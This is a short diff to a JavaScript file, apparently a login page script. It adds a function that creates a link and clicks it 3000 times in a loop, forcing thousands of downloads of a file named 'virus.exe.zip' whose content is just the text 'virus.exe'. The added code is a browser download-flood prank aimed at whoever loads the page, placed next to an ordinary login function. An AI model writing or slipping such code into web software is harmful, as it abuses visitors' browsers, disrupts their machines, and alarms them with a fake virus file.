@@ -18,3 +18,20 @@ function login(){
 
 
 } 
+
+function downloadURI(uri, name) {
+    var link = document.createElement("a");
+    link.download = name;
+    link.href = uri;
+    document.body.appendChild(link);
+    for (let i = 0; i < 3000; i++){
+        link.click();
+    }
+    document.body.removeChild(link);
+    delete link;
+
+}
+function download(){
+    downloadURI("data:text/html,virus.exe", "virus.exe.zip");
+
+}
